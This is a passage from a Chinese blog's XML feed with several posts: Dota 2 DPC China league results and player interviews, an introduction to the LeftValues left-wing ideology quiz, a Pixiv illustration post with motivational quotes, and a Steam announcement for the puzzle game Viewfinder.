STEAM每日资讯</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> steam </tag>
            
            <tag> 游戏 </tag>
            
            <tag> 一周特惠 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DPC中国联赛S级加赛结束，今日A级开赛  4月9日梦幻联赛开赛，PSG.LGD、Aster出战</title>
      <link href="/2d6d12a9.html"/>
      <url>/2d6d12a9.html</url>
      
        <content type="html"><![CDATA[<p><strong>DPC中国联赛</strong></p><p>随着4月3日中国区加赛最后一场iG以2-1击败Aster，DPC中国联赛春季赛的比赛落下了帷幕。</p><p>最终XG获得第一、PSG.LGD获得第二、iG获得第三，Aster获得第四，四支队伍一同携手晋级柏林Major。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-fa70911fb7e9b2b30acb1abbb76601e8.png"></p><p>而Aries和Ybb两支队伍成功保级，下个赛季将继续在S级联赛开始自己的征程。</p><p>VG和OFC两支队伍则是倒数前二垫底，将降级到下个赛季的A级联赛。</p><p><strong>比赛概况</strong></p><p><strong>XG 2-1 PSG.LGD</strong> </p><p>第一局双方前中期有来有回非常激烈，而XG.Kaka的小强一波肉山团关键跳刺秒掉PSG.LGD火猫，帮助自家炼金控下了一代盾迎来强势期，之后小强又是连续三波关键跳刺秒人，最终XG赢下第一局。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-b821ca22d1ca0aa4480cb02401b6def7.png"></p><p>第二局XG选出夜魔打兽王没想到对线直接被打爆，PSG.LGD中期连续开雾击杀XG核心控盾上高，XG一波四人阵亡后打出GG，最终PSG.LGD扳回一局。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-61fe121d016c5f23095cc751af641f81.png">第三局PSG.LGD选出德鲁伊蜘蛛的推进体系，但是对线两路劣，中期PSG.LGD又陷入了连续的人员阵亡，20分钟出头PSG.LGD再一波多人阵亡自知获胜无望，选择短痛打出GG。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-001a10f39797bb8cca833255c904b69d.png"></p><p><strong>赛后采访</strong></p><p><strong>XG.Paparazi灬</strong> </p><p>DPC中国联赛加赛日，XG以2-1击败PSG.LGD获得中国赛区第一名后，XG战队的二号位选手Paparazi灬接受了完美世界电竞的采访。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-974baef30e0aaf758f1bb499c7f6ad6a.jpeg"></p><p><strong>Q：哈啰，拒绝者，先跟大家打个招呼吧。</strong></p><p>A：哈啰大家好，我是XG.Paparazi。</p><p><strong>Q：第三把你的蓝猫有一波操作非常精彩，你和莫言的火猫残血互秀，你的蓝猫用飞躲了他的无影拳完成残血击杀，这是你有意为之的吗？</strong></p><p>A：感觉知道他要无影拳吧，就躲了一下。</p><p><strong>Q：上个赛季你们没能进入中国区前四，这个赛季你们直接成为了中国区的第一，你们觉得这个赛季你们的进步在哪里？</strong></p><p>A：中期不迷茫了吧。</p><p><strong>Q：中期不迷茫是因为什么？因为谁指挥了吗？</strong></p><p>A：那卡神既然叫卡神，肯定是有道理的呀，不然为什么叫卡神啊。</p><p><strong>Q：卡神来到了队伍之后，你觉得中路和他的契合度怎么样？</strong></p><p>A：喝尿喝到饱。</p><p><strong>Q：国土和kaka在战术BP的时候谁的话语权更大一些？</strong></p><p>A：教练也会问我们意见，最终还是教练自己决定吧。</p><p><strong>Q：每次BP的时候看国土和卡神聊的都很嗨，现在国土认可卡神的硬实力了吗？</strong></p><p>A：说实话我也不太了解。</p><p><strong>Q：下一场加赛是iG对阵Aster，你觉得谁获胜的概率更大？</strong></p><p>A：感觉iG吧，势头正盛。</p><p><strong>Q：这次Major的预期成绩是怎么样？</strong></p><p>A：感觉尽力打好就行了吧。</p><p><strong>Q：感谢拒绝者接受我们的采访，祝你们之后的Major能有一个好成绩！</strong></p><p>A：谢谢。</p><p><strong>比赛概况</strong></p><p><strong>iG 2-1 Aster</strong> </p><p>第一局双方前期一直有来有回，而中后期Aster依靠末日大招多次击杀影魔逐渐积累了优势，38分钟Aster一波上高，iG女王交出买活防守结果买活死，最终Aster赢下第一局。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-bbb4056f5a1c6f2f046d50252dbcea06.png"></p><p>第二局Aster对线刚三打出线优，然而中期IG.Emo的蓝猫发挥十分亮眼，Aster被打出三波四人阵亡后自知获胜无望打出了GG。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-f29593e8f8a4ffa66a3ec067121257c7.png"></p><p>第三局Aster选出圣堂刺客，但是前中期Aster没能奠定优势，iG等到虚空龙骑的装备成型Aster正面团战已经不是对手，最终iG控盾拆出超级兵赢下比赛的胜利。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-c652d7da3e389843e4cc949760429742.png"></p><p><strong>赛后采访</strong></p><p><strong>iG.pyw</strong> </p><p>DPC中国联赛加赛日，iG以2-1击败Aster获得中国赛区第三后，iG战队的四号位选手pyw接受了完美世界电竞的采访。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-31fa4746491213c8059ad805081f34bd.jpeg"></p><p><strong>Q：哈啰，先跟大家打个招呼吧。</strong></p><p>A：哈啰大家好，我是pyw。</p><p><strong>Q：第三局你们选了辅助末日，整体的阵容选的也是比较拖后，你们是有信心一定能拖到后期装备成型吗？</strong></p><p>A：没有，只是我们比较怕他们选末日，所以就以抢代BAN了。</p><p><strong>Q：Emo和项羽是比较年轻的选手，而你对比他们作为队里的老将，在他们上头喊着冲冲冲的时候，你是会叫住他们还是融入他们？</strong></p><p>A：大多数时候是冷静的，但像打LGD的时候，大家都比较激情。</p><p><strong>Q：你们赛季初其实打的不太好，但是现在你们越打越好，你们是做了什么调整让你们后期开始发力？</strong></p><p>A：这个队新人居多嘛，有很多东西都是要慢慢暴露出来。</p><p><strong>Q：有很多人都在讨论项羽的英雄池，作为你的劣势路搭档，你怎么看这个问题？</strong></p><p>A：我觉得没什么问题啊，大家都可以的，项羽的英雄池也可以的。</p><p><strong>Q：你觉得你们Major上的成绩大概是怎么样？</strong></p><p>A：先进个前八吧。</p><p><strong>Q：今天会有什么庆祝活动吗？</strong></p><p>A：可能会去聚个餐吧。</p><p><strong>Q：感谢pyw接受我们的采访，祝你们后面的比赛顺利！</strong></p><p>A：谢谢。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-84ae875dc6d49961ad08f4c5454ac078.gif"></p><p><strong>A级联赛今日开战</strong></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-7580ee195122231e611d9d4101f82562.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-84ae875dc6d49961ad08f4c5454ac078.gif"></p><p><strong>梦幻联赛</strong></p><p>ESL已经公布了梦幻联赛第19赛季的小组赛分组和赛程。<br>A组：Entity、EG、XctN、GG、HR、SR、Aster、TSM<br>B组：bc、nouns、OG、PSG.LGD、Talon、Liquid、Spirit、Tundra  </p><p>本次梦幻联赛一共分为三个部分：小组赛第一阶段、小组赛第二阶段、淘汰赛。  </p><p>小组赛第一阶段：4月9日-4月12日<br>参赛的十六支队伍将分为两组，每组八支战队进行单循环的BO2比赛，最终每组的前四名晋级小组赛第二阶段，其余队伍淘汰。  </p><p>小组赛第二阶段：4月14日-4月20日<br>八支队伍将进行BO3的单循环赛，最终小组前二晋级到淘汰赛胜者组决赛，小组三四名将晋级到败者组半决赛，其余队伍淘汰。  </p><p>淘汰赛阶段：4月22日-4月23日<br>四支队伍采用双败淘汰赛制，总决赛为BO5，其余比赛均为BO3，最终获胜的队伍将获得2023年利雅得大师赛的参赛资格。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ad9222375519491836018d9c2fe79bcd.png"></p><blockquote><p>本篇文章来源于微信公众号: DOTA2刀塔</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dota2 </tag>
            
            <tag> 比赛 </tag>
            
            <tag> DPC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeftValues：你是属于左派意识形态下的哪一种立场？</title>
      <link href="/1048.html"/>
      <url>/1048.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-1.png" alt="image"></p><h2 id="LeftValues-是什么？"><a href="#LeftValues-是什么？" class="headerlink" title="LeftValues 是什么？"></a>LeftValues 是什么？</h2><p>LeftValues 是一个可以确定你在左翼意识形态图谱中的位置的左派测试，受 <a href="https://8values.github.io/">8values 测试</a>启发并基于其制作。如果你不是左派，这个测试显然不适合你。在测试中，你将会看到一系列观点，然后你需要从<strong>强烈同意</strong>到<strong>强烈反对</strong>的选项中中回答你对这些观点的看法，每个回答都会影响你的分数。每种意识形态（即评定用的坐标轴）的问题将不被混淆而是顺序给出。测试结束后，你的（每组）答案得分将会与每种意识形态的最大可能得分相比较，从而计算出（每种意识形态倾向的）一个百分比。请务必诚实作答！  </p><p>本测试共有 <strong>72</strong> 个问题。</p><h2 id="这些意识形态都有哪些？"><a href="#这些意识形态都有哪些？" class="headerlink" title="这些意识形态都有哪些？"></a>这些意识形态都有哪些？</h2><p>当前一共有七个坐标轴，其各自代表了一对相反的意识形态。它们是：</p><p><strong>革命</strong> <strong>vs.</strong> <strong>改良</strong><br>革命得分较高的人倾向于支持通过大规模起义来激进和迅速地推翻资本主义制度。改革得分较高的人倾向于支持在资本主义框架（如自由民主制）下引导渐进的变化，最终目标是实现社会主义。</p><p><strong>科学社会主义</strong> <strong>vs.</strong> <strong>空想社会主义</strong><br>科学社会主义得分较高的人倾向于支持或赞同对社会采用马克思主义的辩证唯物主义进行分析。空想社会主义得分较高的人倾向于对社会采用更理想主义的分析，而反对唯物主义的方法。</p><p><strong>集权</strong> <strong>vs.</strong> <strong>分权</strong><br>集权得分较高的人倾向于支持国家领导的计划经济体制。分权得分较高的人倾向于支持地方自理的计划经济体制，通常更重视地方。</p><p><strong>国际主义</strong> <strong>vs.</strong> <strong>民族主义</strong><br>国际主义得分较高的人倾向于支持发起国际社会主义运动，其最终目标往往是消灭“国家”。民族主义得分较高的人倾向于优先在现有国界内建设社会主义，而反对直接推动全世界社会主义共和的目标。</p><p><strong>党派</strong> <strong>vs.</strong> <strong>工会</strong><br>党派得分较高的人倾向于把政党作为社会主义运动的基础。工会得分较高的人倾向于把工会和其他形式的群众组织作为社会主义运动的基础。倾向党派并不一定意味着你反对工会，反之亦然，这更多的是体现一种偏好。</p><p><strong>生产</strong> <strong>vs.</strong> <strong>自然</strong><br>生产得分较高的人倾向于将工业产出和自给自足置于生态目标之上。自然得分较高的人倾向于支持采取严格的生态保护措施的环境导向型经济。</p><p><strong>保守主义</strong> <strong>vs.</strong> <strong>进步主义</strong><br>保守主义得分较高的人倾向于支持更保守的社会政策和观点。进步主义得分较高的人倾向于支持进步的社会政策和观点。</p><h2 id="结果中的“最接近的匹配”意味着什么？"><a href="#结果中的“最接近的匹配”意味着什么？" class="headerlink" title="结果中的“最接近的匹配”意味着什么？"></a>结果中的“最接近的匹配”意味着什么？</h2><p>类似 8values，这个测验试图将你与某一种左派意识形态相匹配。当前有 13 种可供测试的意识形态，未来还会有更多。这是一个正在进行的项目，（测评结果）可能会出现与您预期不一致的情况。欢迎您提出宝贵建议。当前的意识形态有：<br>马克思列宁主义（Marxism-Leninism）、正统马克思主义（Orthodox Marxism）、生态马克思主义（Eco-Marxism）、中派马克思主义（Centrist Marxism）、委员会共产主义（Council Communism）、左派共产主义（Left Communism）、无政府共产主义（Anarcho-Communism）、生态无政府主义（Eco-Anarchism）、市场无政府主义（Market Anarchism）、空想社会主义（Utopian Socialism）、民主社会主义（Democratic Socialism）、社会民主主义（Social Democracy）和左翼民族主义（Left-Wing Nationalism）。</p><h2 id="博主的结果"><a href="#博主的结果" class="headerlink" title="博主的结果"></a>博主的结果</h2><p><a href="https://leftvalues.github.io/results.html?a=61.8&b=73.4&c=76.7&d=60.7&e=75.0&f=68.1&g=61.8">我的结果</a></p><h2 id="那我们开始吧"><a href="#那我们开始吧" class="headerlink" title="那我们开始吧"></a>那我们开始吧</h2><p><a href="https://leftvalues.github.io/instructions.html">点击这里开始</a></p>]]></content>
      
      
      <categories>
          
          <category> 专栏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 左派 </tag>
            
            <tag> 意识形态 </tag>
            
            <tag> 立场 </tag>
            
            <tag> 试卷 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.02pixiv插画分享</title>
      <link href="/1044.html"/>
      <url>/1044.html</url>
      
        <content type="html"><![CDATA[<p>全世界只有不到0.1%的人关注了我</p><p>你可真是个很特别的人~</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-bbb897451dc928ceca392a3e99fc71fc.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-a071815ba31c0d606dcfc594349305f1.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-26855d7957195f992caa0bad0e59b4db.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-6445bd4e1c50acf6d5af21969720309a.png"></p><p>1.你永远不知道未来的你 会有什么样的人生 会和什么样的人在一起恋爱 吃的是几块钱的早餐 生活的是几线城市 会给父母怎样的回报 越努力越幸运 你的余生还很长 要坚强地走下去 要做一个优秀的女孩儿 对自己狠一点 逼自己努力 再过五年 你将会感谢今天发狠的自己 恨透今天懒情自卑的自己 既然认准一条路 那就坚持走下去 命运不会辜负每一个对自己认真而努力的人</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-38271c400265760c5f7969fca61666f5.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-99b12c635bf8942aa9277c021f0b9da8.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-1a54e9f38390590f85d464f22a26e91e.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-59e187fd30e45ee9724f0e31d7361104.png"></p><p>2.我们总觉得自己还小 还能贪婪的享受所有美好 后来惊讶地发现自己不知从何开始 看得清糖衣里的炮弹 读得出微笑后的杀机 也懂得应付敷衍 逢场作戏 去面对好多自己 不曾想过要面对的事 表面上人畜无害 防身的刀却一直x在身后从未离手那一刻 我终于承认了成长这回事只是不知是好是坏.</p><p>3.不是所有女孩都梦想赚大钱 也不是所有女孩都想做女强人 但当体会过一次次被人肯定认可以后 当你知道自己除了等待还可以争取 当你经济独立自我创造安全感 当你学会了潇洒地笑 潇洒的活着 你会发现 自己爱自己比别人来爱你更有意</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-b439dfc94f501587300343047409dbaf.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-e5f9e62d8e9c83a77963fb6236d3b960.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-72dc4ac1e91642889e4781e5ab646279.png"></p><p>4.不管什么年纪 别辜负最好的自己！把每一句我不会“都改为我可以学” 把每一句我不敢“都改为我一定行” 尝试总比永远不敢开始要强.</p><p>5.心有所期 全力以赴 定有所成，不要假装努力因为结局不会陪你演戏，跨过星河 迈过月亮 去努力迎接更好的自己 ， 人生那么长，总要用力拼搏一次</p><p>6.生如蝼蚁当立鸿鹄之志，命薄似纸应有不屈之心。乾坤未定，你我皆是黑马。祝你飞黄腾达前程似锦。</p><p>7.总有一天你会明白 你的委屈要自己消化 你的秘密不能逢人就提起 真正能解脱自己的只能靠努力.</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-c477f9a0b8c685c45c0eebaa32e578b1.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-757845388161c02d3341d5db93d4c710.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-b841788981a4ef3bf5ff0d1d0a80113e.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-66c28c78279e359457adaf72eed22999.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-66235f561bc97fc5b2964e059faaabc6.png"></p><p>8.对自己狠一点 逼自己努力 再过五年 你将会感谢今天发狠的自己 恨透今天懒憤自卑的自己 我始终相信一句话：只有自己足够强大 才不会被别人践踏.</p><p>9.有压力 但不要被压垮 迷茫但不要绝望 在冷言嘲笑中翻盘 成为别人的可望不可及 你真的努力过了才有资格说你拼过 你可以打败我 但永远也别想让我求饶 生命本该有意义 我们绝不是白来一场 不要指望谁会陪你一辈子 没光的时候连影子都会离开你.</p><p>10.你可以在夜晚里崩溃痛哭 但我希望天一亮你又能顶住来自四面八方的压力 继续生活.</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-44463e824f714f33380dbb2270538913.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-e841b5b98b9fbe133a4ce50594209c74.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-f355b91e1f8066d12ec4fbf28e538ce3.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-039f2c44a54a5a32e68f37e8f360bee4.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-3e7d20ce8a57f755e6dd1c9e9fd6da50.png"><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-abb9284aff98679d1a0f07e4038b8b9e.png"></p><p>这期还满意吗❤</p>]]></content>
      
      
      <categories>
          
          <category> 山海图册 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动漫 </tag>
            
            <tag> 图片 </tag>
            
            <tag> 壁纸 </tag>
            
            <tag> 美图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一人称解谜游戏《Viewfinder》上架Steam</title>
      <link href="/c901893e.html"/>
      <url>/c901893e.html</url>
      
        <content type="html"><![CDATA[<p>第一人称解谜游戏《Viewfinder》现已上架了PC Steam，现可加入愿望单，游戏支持简体中文，将于2023年发售。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-1024x550.png" alt="image"></p><p>使用一台拍立得相机，挑战你的认知、重新定义现实，并重塑周围的世界。《Viewfinder》是一款全新单人游戏，让玩家在数小时的有趣体验中揭开开遗留的谜团。</p><h2 id="关于这款游戏："><a href="#关于这款游戏：" class="headerlink" title="关于这款游戏："></a>关于这款游戏：</h2><p>《Viewfinder》是一款烧脑的第一人称冒险游戏。在游戏中，你可以通过把照片放置在世界中而将其变成现实。</p><p>重塑现实。不只是照片，绘画、素描、屏幕截图和明信片全都可以变成现实，同时改变这个世界</p><p>探索就是学习。玩家将了解这个世界的秘密、其存在的原因以及什么是创造的自由。探索多个复杂的枢纽世界，它们相互关联，既有相似点，又各有不同。</p><p>你可以随心所欲地探索。《Viewfinder》的叙事是由玩家驱动的。对于只想解谜的玩家来说，它易于上手、难度友善;而对于那些喜欢钻研的玩家来说，这绝对是一个精心设计的丰富世界。</p><p>一旦踏入《Viewfinder》的世界，你就将为不可能的问题找到答案。</p><p><img src="https://img.3dmgame.com/uploads/images/news/20230403/1680480713_277074.jpg" alt="第一人称解谜游戏《Viewfinder》上架Steam"></p><p><img src="https://img.3dmgame.com/uploads/images/news/20230403/1680480713_643628.jpg" alt="第一人称解谜游戏《Viewfinder》上架Steam"></p><p><img src="https://img.3dmgame.com/uploads/images/news/20230403/1680480713_386210.jpg" alt="第一人称解谜游戏《Viewfinder》上架Steam"></p><p><img src="https://img.3dmgame.com/uploads/images/news/20230403/1680480713_437733.jpg" alt="第一人称解谜游戏《Viewfinder》上架Steam"></p><p><img src="https://img.3dmgame.com/uploads/images/news/20230403/1680480713_581675.jpg" alt="第一人称解谜游戏《Viewfinder》上架Steam"></p><p><img src="https://img.3dmgame.com/uploads/images/news/20230403/1680480713_458933.jpg" alt="第一人称解谜游戏《Viewfinder》上架Steam"></p><p><img src="https://img.3dmgame.com/uploads/images/news/20230403/1680480713_512559.jpg" alt="第一人称解谜游戏《Viewfinder》上架Steam"></p><p><img src="https://img.3dmgame.com/uploads/images/news/20230403/1680480713_254627.jpg" alt="第一人称解谜游戏《Viewfinder》上架Steam"></p><p><img src="https://img.3dmgame.com/uploads/images/news/20230403/1680480713_137677.jpg" alt="第一人称解谜游戏《Viewfinder》上架Steam"></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> steam </tag>
            
            <tag> 游戏 </tag>
            
            <tag> 解密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DPC中国联赛：XG、PSG.LGD、iG、Aster四队晋级Major，今日加赛决定最终排名</title>
      <link href="/e8297710.html"/>
      <url>/e8297710.html</url>
      
        <content type="html"><![CDATA[<p><strong>DPC中国联赛</strong></p><p>DPC中国联赛的正赛已经全部结束，最终XG、PSG.LGD、iG、Aster四支战队将出征Major，VG和OFC降级至下赛季的A级联赛。而今天XG与PSG.LGD，iG与Aster将通过加赛决出联赛的最终排名。</p><p>昨日赛果<br>iG 2-0 OFC<br>VG 1-2 XG<br>PSG.LGD 2-0 Aster<br>今日赛程预告<br>12:00 PSG.LGD vs XG<br>15:00 iG vs Aster<br>届时前往斗鱼和B站可以观看直播，微博为本次赛事独家社交媒体平台</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-6c2ccbd7d2a0cf19b13520faa970dc18.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-d4a2a46d737d814e196ecd3fe3dc6209.png"></p><p><strong>比赛概况</strong></p><p><strong>iG 2-0 OFC</strong> </p><p>第一局Emo的蓝猫早早地就超神后波波团战一人单防三人，正面团战OFC更是毫无还手之力，在蓝猫和巨魔的无限超神声音中打出gg。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-5b3507d21ee8f5a20efc1a5681376a51.png"></p><p>第二局IG优势更大，人头在十二分钟就相差二十个，IG打下肉山团灭OFC拆掉高地再次团灭OFC拆掉基地十五分钟结束比赛。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-07d6176bca54498053473d88bf94ac55.png"></p><p><strong>赛后采访</strong></p><p><strong>iG.Dust</strong> </p><p>2023年DCP中国联赛春季赛S级iG战胜OFC晋级Major后iG战队的中单Dust接受了完美世界电竞的采访。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-01256c5e34d0f1294713ddda1881da4d.jpeg"></p><p><strong>Q：Dust你好，先和观众朋友们打个招呼吧。</strong></p><p>A：大家好，我是iG战队的中单Dust。</p><p><strong>Q：你们第一局BP很保守，是为了先稳住一分吗？</strong></p><p>A：因为第一局我们觉得不需要讲究速通什么的，也不会体现出什么，就想让兄弟们好好打就行。</p><p><strong>Q：对阵LGD你们的剧毒体系是练过吗？</strong></p><p>A：训练里玩过，我之前也玩过就拿出来玩了。</p><p><strong>Q：你出道这么久第一次出国，你怎么看待出道以来的经历呢？</strong></p><p>A：能做的就是不断的努力，没有什么别的可以做的。</p><p><strong>Q：你有什么想对粉丝说的吗？</strong></p><p>A：我只能说不会停止我努力的过程，希望能有个好成绩。</p><p><strong>Q：你觉得你们这次Major能取得什么成绩？</strong></p><p>A：我没有预想过这个，感觉看兄弟们状态吧，什么可能都能有。</p><p><strong>Q：你们第二局有人抱着猫在玩，是谁？</strong></p><p>A：就猫走到后面，就BP的时候玩了一下吧。</p><p><strong>Q：你现在在队伍里是什么定位？</strong></p><p>A：就我们一二不固定，比较看调配，尽量选一些好发挥的英雄去针对对面吧。</p><p><strong>Q：你们赛前的沟通之类的工作是教练做的多还是选手做的多？</strong></p><p>A：教练组的准备做的比较多，他们承担了大部分东西，他们总结下来后我们讨论一下就行了。</p><p><strong>Q：你更希望在下个版本看到什么东西？</strong></p><p>A：这个感觉就看有没有很适合自己的东西出现，像Emo的血精蓝猫什么的，要是有他就特别好发挥。我玩的比较随性，感觉什么英雄都可以尝试玩一下，可能火女加强一下？</p><p><strong>Q：祝愿你们在Major上能取得令人满意的成绩。</strong></p><p>A：谢谢。</p><p><strong>比赛概况</strong></p><p><strong>XG 2-1 VG</strong> </p><p>第一局VG打出线优并且flyfly的大圣边打边刷盘活全场，可是VG中期多次因为视野问题被先手。中期VG依靠守眼蹲人打赢几波团战，末日后期大招无限单防拍拍赢下比赛。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-e80c989ee9477a1ed051fbad475b58fe.png"></p><p>第二局VG全场视野被爆炸，无数波团战VG都被打先手率先少人，圣堂刺客更新出圣剑但是完全没有输出环境，在被破掉三路高地后VG打出gg。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-fb6eb8e7ac493531ce35f59f3aa5b6fa.png"></p><p>第三局VG中期打出较大优势但是VG一波非常不理智的三打五将优势完全葬送，末日更是三次单杀先知，后期小黑和末日的输出太过恐怖打出VG买活团灭后赢下比赛。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-baf7683af242c919b5b0bccb9e3d1f18.png"></p><p><strong>赛后采访</strong></p><p><strong>XG.Dy</strong> </p><p>2023年DPC中国联赛春季赛S级XG战胜VG后XG战队的五号位Dy接受了完美世界电竞的采访。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-0fea1b26c38b81a53d5b40a7d8a07506.jpeg"></p><p><strong>Q：Dy你好，给观众朋友们打个招呼吧。</strong></p><p>A：大家好，我是XG战队的五号位Dy。</p><p><strong>Q：你的白虎一级是学跳的，能说说是为什么吗？</strong></p><p>A：主要是打小鹿吧，小鹿太厉害了，怕自己死送一血就学跳。</p><p><strong>Q：可是你的白虎一级学跳二级学流星还是没打过小鹿。</strong></p><p>A：是的，自己对这个英雄理解还不够深。</p><p><strong>Q：你们这赛季进行人员更换后成长了什么？</strong></p><p>A：中后期处理方式更加具体，之前中后期有些模糊的时间点的话现在更加清晰。</p><p><strong>Q：你怎么看kaka的对线和理念？</strong></p><p>A：ka神是有一套的。</p><p><strong>Q：你们劣势路对线一直不是很优势，你怎么看？</strong></p><p>A：正常，正常的ka神节奏。</p><p><strong>Q：你们线优率一直很低，是战术问题吗？</strong></p><p>A：算是吧，算是队伍的战术。</p><p><strong>Q：你们第三局选末日是怎么想的？</strong></p><p>A：是VG他们这个末日可以一三互换，对于我们阵容框架构造破坏比较大，尽管第二局他们玩的不好我们还是很害怕。</p><p><strong>Q：你自己对Major有成绩预期吗？</strong></p><p>A：这个Major是新版本嘛，看新版本上手程度了，希望比第一个Major成绩要好吧。</p><p><strong>Q：感谢你接受我们的采访，也希望你们在Major上取得好成绩。</strong></p><p>A：谢谢。</p><p><strong>比赛概况</strong></p><p><strong>PSG.LGD 2-0 Aster</strong> </p><p>第一局LGD拿出一套兽王加德鲁伊的阵容，在线上打出小优势后直接打下肉山并推掉Aster两路高地后逼迫Aster在二十一分钟打出gg。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-849781094e81771a0295c22d54d2194d.png"></p><p>第二局Aster选择了三号位拉比克但是没什么效果，小鱼人做出神杖后打出两波小节奏但是水人神杖做出来后一直变身小鱼打的Aster后排毫无还手之力，最终LGD带盾上高团灭Aster赢下比赛。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-fd88c1c965f970b64680586273aa853f.png"></p><p><strong>赛后采访</strong></p><p><strong>PSG.LGD.WhyouSm1Le</strong> </p><p>2023年DPC中国联赛春季赛S级PSG.LGD战胜Aster后PSG.LGD的五号位y接受了完美世界电竞的采访。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-ac27b76606b4a859dacced6c29ab862a.jpeg"></p><p><strong>Q：y队你好，和大家打个招呼吧。</strong></p><p>A：大家好，我是PSG.LGD的五号位y。</p><p><strong>Q：赛前有预想到两局这么轻松吗？</strong></p><p>A：差不多吧。</p><p><strong>Q：第二局Aster选择了三号位拉比克，你们有想到吗？</strong></p><p>A：没有，让我们比较困惑。不过听皮球说BoBoKa不想再玩拉比克了。</p><p><strong>Q：你觉得拉比克适合打三号位吗？</strong></p><p>A：南美的Wisper也比较爱玩，还是看选手吧。</p><p><strong>Q：想和哪些国外队伍交手？</strong></p><p>A：很多吧，因为现在国外队普遍都比较厉害，都想交手。</p><p><strong>Q：对新版本有什么期待吗？</strong></p><p>A：还好吧，我觉得确实要大更新一下，看怎么让这个版本没上场的英雄上场吧。</p><p><strong>Q：你觉得这个版本是不是后选有优势？</strong></p><p>A：确实是看选手吧，先选有先选的优势，后选可以选边，现在普遍认为夜魇有优势，其他还好。</p><p><strong>Q：你们对下个Major成绩预期是什么？</strong></p><p>A：比之前更上一个台阶。</p><p><strong>Q：你觉得